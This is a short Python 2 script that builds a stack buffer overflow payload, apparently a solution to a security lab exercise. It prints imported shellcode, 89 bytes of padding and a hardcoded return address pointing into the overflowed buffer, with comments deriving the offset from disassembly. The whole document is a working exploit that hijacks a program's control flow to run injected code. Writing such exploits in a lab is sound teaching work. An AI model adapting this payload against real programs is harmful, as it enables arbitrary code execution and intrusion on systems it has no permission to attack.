from shellcode import shellcode
from struct import pack


# EBP = 0xbffef238
# BuF = 0xbffef1cc  (EBP - 0x6C)

# disassemble vulnerable: lea    -0x6c(%ebp),%eax
# 0x6c in Hex: 108 in Dec
# Length of shellcode 23
# 108 + 4 (for ret) - 23 = 89

add = 0xbffef1cc
print shellcode + "X"*89 + pack("<I" , add)
